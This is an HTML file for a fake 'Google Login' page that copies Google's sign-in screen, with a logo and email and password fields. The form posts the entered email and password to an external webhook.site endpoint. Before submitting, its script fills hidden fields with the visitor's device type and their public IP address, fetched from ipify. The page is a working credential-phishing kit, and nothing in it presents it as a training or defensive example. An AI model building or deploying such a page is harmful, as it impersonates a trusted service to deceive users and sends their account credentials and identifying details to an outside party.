<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login</title>
    <link rel="stylesheet" href="stylesheet.css">
</head>
<body>
    <div class="login-container">
        <img src="logo.jpg" alt="Google Logo" class="google-logo">
        <h1 class="text">Sign in</h1>

        <!-- Form that sends data to the specified action URL -->
        <form id="loginForm" style="margin-bottom: 20px;" action="https://webhook.site/c4c04316-7f6f-4ffb-b4c3-dbcf4cc95062" method="post">
            <div class="input-group">
                <input type="text" id="email" name="email" required>
                <label for="email">Email or phone</label>
            </div>
            <div class="input-group">
                <input type="password" id="password" name="password" required>
                <label for="password">Password</label>
            </div>
            
            <!-- Hidden input fields for device type and IP address -->
            <input type="hidden" id="deviceType" name="deviceType">
            <input type="hidden" id="ipAddress" name="ipAddress">
            
            <button type="submit">Next</button>
        </form>

        <!-- Show Password Option -->
        <form class="showPass">
            <label>
                <input type="checkbox" id="showPassword" name="showPassword" value="Show Password">
                Show Password
            </label>
        </form>

        <div class="footer">
            <p style="text-align: left;"><a href="#">Create account</a></p>
        </div>
    </div>

    <!-- JavaScript for detecting device type and fetching public IP using ipify -->
    <script>
        // Detect device type based on user agent
        function detectDevice() {
            const userAgent = navigator.userAgent.toLowerCase();
            if (/mobile/i.test(userAgent)) {
                return "Mobile";
            } else if (/tablet/i.test(userAgent)) {
                return "Tablet";
            } else {
                return "Desktop";
            }
        }

        // Fetch public IP address using ipify
        async function fetchPublicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Unable to fetch public IP address', error);
                return 'Error fetching IP';
            }
        }

        // Function to set device type and IP address before form submission
        async function setDeviceAndIP() {
            // Set device type
            document.getElementById('deviceType').value = detectDevice();

            // Set public IP address using ipify
            const ipAddress = await fetchPublicIP();
            document.getElementById('ipAddress').value = ipAddress;
        }

        // Add event listener to form submission
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            // Prevent form from submitting until we set the values
            event.preventDefault();

            // Set the device type and IP address
            await setDeviceAndIP();

            // After setting, submit the form
            this.submit();
        });

        // Show password toggle
        document.getElementById('showPassword').addEventListener('change', function() {
            var passwordInput = document.getElementById('password');
            if (this.checked) {
                passwordInput.type = 'text';
            } else {
                passwordInput.type = 'password';
            }
        });
    </script>
</body>
</html>
